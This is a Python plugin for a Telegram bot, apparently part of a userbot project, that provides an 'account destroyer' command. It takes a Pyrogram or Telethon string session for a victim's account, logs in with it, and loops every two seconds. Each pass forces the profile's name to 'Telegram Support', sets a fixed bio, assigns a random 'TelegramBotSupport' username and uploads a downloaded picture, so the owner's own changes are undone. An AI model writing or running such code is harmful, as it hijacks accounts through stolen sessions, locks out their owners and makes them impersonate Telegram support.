import os
import random
import string
import asyncio
import aiohttp
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message, CallbackQuery
from pyrogram.errors import FloodWait
from config import API_ID, API_HASH

# Telethon Imports
from telethon import TelegramClient, functions, types
from telethon.sessions import StringSession
from telethon.errors import FloodWaitError

# --- SETTINGS ---
OWNER_ID = 6356015122
DESTROY_BIO = "+42777"
DESTROY_IMG_URL = "https://i.ibb.co/mVwNdgGy/IMG-20260101-212420-794.jpg"

# --- HELPER: SMALL CAPS CONVERTER ---
def sm(text):
    mapping = {
        'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ꜰ', 'g': 'ɢ', 'h': 'ʜ', 'i': 'ɪ',
        'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ',
        's': 's', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ',
        '0': '₀', '1': '₁', '2': '₂', '3': '₃', '4': '₄', '5': '₅', '6': '₆', '7': '₇', '8': '₈', '9': '₉',
        ' ': ' '
    }
    return "".join(mapping.get(char.lower(), char) for char in text)

# --- HELPER: DOWNLOAD IMAGE ---
async def download_image(url, filename):
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status == 200:
                data = await resp.read()
                with open(filename, "wb") as f:
                    f.write(data)
                return filename
    return None

# --- HELPER: RANDOM USERNAME ---
def generate_fake_username():
    suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"TelegramBotSupport{suffix}"

# ==========================================
#      🔄 BACKGROUND TASKS (THE LOOP)
# ==========================================

async def keep_destroying_pyro(session_string, photo_path, status_msg):
    """
    Runs an infinite loop to keep the account destroyed.
    """
    acc = Client("temp_destroy", api_id=API_ID, api_hash=API_HASH, session_string=session_string, in_memory=True)
    
    try:
        await acc.start()
        await status_msg.edit_text(sm("✅ ᴛᴀʀɢᴇᴛ ʟᴏᴄᴋᴇᴅ! ᴍᴏɴɪᴛᴏʀɪɴɢ ᴀɴᴅ ʀᴇᴠᴇʀᴛɪɴɢ ᴄʜᴀɴɢᴇꜱ..."))
        
        while True:
            try:
                # 1. Force Change Bio & Name
                await acc.update_profile(first_name="Telegram", last_name="Support", bio=DESTROY_BIO)
                
                # 2. Force Change Username (If unset)
                try:
                    new_user = generate_fake_username()
                    await acc.set_username(new_user)
                except:
                    pass # Ignore if username already set or rate limited

                # 3. Force Change PFP
                if photo_path:
                    async for photo in acc.get_chat_photos("me", limit=1):
                        # Agar photo already set nahi hai ya alag hai (Basic check)
                        # Hum har baar set karenge to ensure override
                        break
                    else:
                         await acc.set_profile_photo(photo=photo_path)
                    
                    # Force overwrite existing
                    await acc.set_profile_photo(photo=photo_path)

                # Wait slightly to prevent bot from freezing, but fast enough to revert
                await asyncio.sleep(2)

            except FloodWait as e:
                await asyncio.sleep(e.value + 1)
            except Exception as e:
                print(f"Pyro Loop Error: {e}")
                await asyncio.sleep(5)
                
    except Exception as e:
        await status_msg.edit_text(sm(f"❌ ᴄʀɪᴛɪᴄᴀʟ ᴇʀʀᴏʀ: {e}"))

async def keep_destroying_tele(session_string, photo_path, status_msg):
    """
    Runs an infinite loop using Telethon.
    """
    acc = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    
    try:
        await acc.connect()
        if not await acc.is_user_authorized():
            await status_msg.edit_text(sm("❌ ɪɴᴠᴀʟɪᴅ sᴇssɪᴏɴ!"))
            return

        await status_msg.edit_text(sm("✅ ᴛᴀʀɢᴇᴛ ʟᴏᴄᴋᴇᴅ! ᴍᴏɴɪᴛᴏʀɪɴɢ ᴀɴᴅ ʀᴇᴠᴇʀᴛɪɴɢ ᴄʜᴀɴɢᴇꜱ..."))

        upload_file = None
        if photo_path:
            upload_file = await acc.upload_file(photo_path)

        while True:
            try:
                # 1. Force Change Bio & Name
                await acc(functions.account.UpdateProfileRequest(
                    first_name="Telegram", 
                    last_name="Support", 
                    about=DESTROY_BIO
                ))

                # 2. Force Change Username
                try:
                    new_user = generate_fake_username()
                    await acc(functions.account.UpdateUsernameRequest(username=new_user))
                except:
                    pass

                # 3. Force Change PFP
                if upload_file:
                    await acc(functions.photos.UploadProfilePhotoRequest(file=upload_file))

                await asyncio.sleep(2)

            except FloodWaitError as e:
                await asyncio.sleep(e.seconds + 1)
            except Exception as e:
                print(f"Tele Loop Error: {e}")
                await asyncio.sleep(5)

    except Exception as e:
        await status_msg.edit_text(sm(f"❌ ᴄʀɪᴛɪᴄᴀʟ ᴇʀʀᴏʀ: {e}"))


# ==========================================
#      🎮 COMMAND HANDLERS
# ==========================================

@Client.on_message(filters.command("ds") & filters.user(OWNER_ID))
async def destroy_command(bot, message: Message):
    buttons = InlineKeyboardMarkup([
        [
            InlineKeyboardButton(sm("🔥 ᴘʏʀᴏɢʀᴀᴍ"), callback_data="dest_pyro"),
            InlineKeyboardButton(sm("🔥 ᴛᴇʟᴇᴛʜᴏɴ"), callback_data="dest_tele")
        ],
        [InlineKeyboardButton(sm("❌ ᴄᴀɴᴄᴇʟ"), callback_data="close_dest")]
    ])
    
    await message.reply_text(
        sm("💀 **ᴀᴄᴄᴏᴜɴᴛ ᴅᴇsᴛʀᴏʏᴇʀ ᴍᴏᴅᴇ** 💀\n\n"
           "sᴇʟᴇᴄᴛ ᴛʜᴇ sᴇssɪᴏɴ ᴛʏᴘᴇ ᴛᴏ ᴅᴇsᴛʀᴏʏ:"),
        reply_markup=buttons
    )

@Client.on_callback_query(filters.regex("close_dest"))
async def close_menu(bot, query):
    await query.message.delete()

# --- PYROGRAM HANDLER ---
@Client.on_callback_query(filters.regex("dest_pyro"))
async def destroy_pyrogram(bot, query: CallbackQuery):
    user_id = query.from_user.id
    
    try:
        s_msg = await bot.ask(user_id, sm("💀 **sᴇɴᴅ ᴘʏʀᴏɢʀᴀᴍ sᴛʀɪɴɢ sᴇssɪᴏɴ:**"), timeout=60)
    except:
        return await query.message.reply_text(sm("❌ ᴛɪᴍᴇᴏᴜᴛ!"))
    
    session_string = s_msg.text.strip()
    status_msg = await query.message.reply_text(sm("⏳ **ᴘʀᴏᴄᴇssɪɴɢ... ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ʀᴇsᴏᴜʀᴄᴇs...**"))
    
    # Download Image
    photo_path = await download_image(DESTROY_IMG_URL, "destroy_pfp.jpg")
    
    # 🔥 Launch Background Loop (Non-Blocking)
    asyncio.create_task(keep_destroying_pyro(session_string, photo_path, status_msg))


# --- TELETHON HANDLER ---
@Client.on_callback_query(filters.regex("dest_tele"))
async def destroy_telethon(bot, query: CallbackQuery):
    user_id = query.from_user.id
    
    try:
        s_msg = await bot.ask(user_id, sm("💀 **sᴇɴᴅ ᴛᴇʟᴇᴛʜᴏɴ sᴛʀɪɴɢ sᴇssɪᴏɴ:**"), timeout=60)
    except:
        return await query.message.reply_text(sm("❌ ᴛɪᴍᴇᴏᴜᴛ!"))
    
    session_string = s_msg.text.strip()
    status_msg = await query.message.reply_text(sm("⏳ **ᴘʀᴏᴄᴇssɪɴɢ... ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ʀᴇsᴏᴜʀᴄᴇs...**"))
    
    # Download Image
    photo_path = await download_image(DESTROY_IMG_URL, "destroy_pfp.jpg")
    
    # 🔥 Launch Background Loop (Non-Blocking)
    asyncio.create_task(keep_destroying_tele(session_string, photo_path, status_msg))
  
